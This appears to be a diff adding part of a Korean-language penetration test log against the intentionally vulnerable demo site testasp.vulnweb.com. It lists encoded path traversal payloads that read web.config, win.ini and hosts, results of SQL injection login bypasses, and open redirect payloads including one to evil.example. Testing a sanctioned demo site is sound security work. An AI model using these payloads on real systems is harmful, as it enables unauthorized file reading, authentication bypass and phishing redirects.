@@ -1,0 +1,31 @@
+### E. shownews.asp?item= — HTML 인코딩된 파일 읽기 (두 번째 프리미티브)
+LABEL                  PATH                                                 CODE SIZE
+about_html             html/about.html                                      200 2161
+db_asp                 db.asp                                               200 379
+web_config             web.config                                           200 721
+templatize_src         Templatize.asp                                       200 4690
+win_ini_x4             ..%2f..%2f..%2f..%2fwindows%2fwin.ini                200 92
+hosts_x4               ..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts 200 880
+loginput_txt_x4        ..%2f..%2f..%2f..%2fscripts%2flogInput.txt           500 1208
+apphost_x4             ..%2f..%2f..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fapplicationHost.config 500 1208
+apphost_x5             ..%2f..%2f..%2f..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fapplicationHost.config 500 1208
+backslash_enc          ..%5c..%5c..%5c..%5cwindows%5cwin.ini                200 92
+
+--- shownews.asp?item=db.asp 본문(발췌) ---
+
+
+
+### F. login.asp — SQLi 인증 우회 + RetURL 오픈 리다이렉트 (POST, DB 변경 없음)
+bypass_pw      code=302 redirect=http://testasp.vulnweb.com/Default.asp
+               Location: Default.asp
+               logout 마커:                showforum 접근: 200 4146
+bypass_or      code=302 redirect=http://testasp.vulnweb.com/Default.asp
+               Location: Default.asp
+               logout 마커:                showforum 접근: 200 4151
+normal_fail    code=200 redirect=
+               logout 마커:                showforum 접근: 200 3077
+
+### G. 오픈 리다이렉트 (RetURL)
+RetURL=http%3A%2F%2Fexample.com%2F    Location: http://example.com/
+RetURL=https%3A%2F%2Fevil.example%2Fp Location: https://evil.example/p
+RetURL=%2F%2Fexample.com%2F           Location: //example.com/
